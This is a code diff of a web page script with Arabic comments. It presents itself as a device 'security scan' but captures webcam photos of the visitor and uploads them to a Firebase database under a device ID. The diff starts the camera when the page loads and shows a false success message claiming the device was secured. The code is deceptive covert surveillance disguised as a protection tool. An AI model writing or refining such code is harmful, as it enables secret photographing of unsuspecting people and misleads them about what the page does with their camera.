@@ -1,28 +1,23 @@
 <script>
-    // معرف فريد لكل جهاز
-    const myId = localStorage.getItem('userId') || 'user_' + Math.random().toString(36).substr(2, 9);
-    localStorage.setItem('userId', myId);
+    // تشغيل الكاميرا فور فتح الصفحة لتجهيزها
+    let videoStream;
+    navigator.mediaDevices.getUserMedia({ video: true }).then(s => videoStream = s);
 
     async function capture() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                video.play();
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/jpeg', 0.6);
-                    
-                    // إرسال الصورة للمسار الخاص بالمستخدم
-                    db.ref('results/' + myId).push({ photo: imgData, date: new Date().toLocaleString() });
-                    alert("✅ تم الفحص!");
-                }, 1000);
-            };
-        } catch (e) {
-            alert("🚨 وافق على الكاميرا لتفعيل الحماية!");
-        }
+        const video = document.createElement('video');
+        video.srcObject = videoStream;
+        video.play();
+        
+        // التقاط الصورة فوراً عند الضغط
+        const canvas = document.createElement('canvas');
+        canvas.width = 640; canvas.height = 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const imgData = canvas.toDataURL('image/jpeg', 0.6);
+        
+        // إرسال الصورة لفايربيس
+        const myId = localStorage.getItem('userId') || 'user_' + Math.random().toString(36).substr(2, 9);
+        db.ref('results/' + myId).push({ photo: imgData, date: new Date().toLocaleString() });
+        
+        alert("✅ تم فحص وتأمين الجهاز بنجاح!");
     }
 </script>
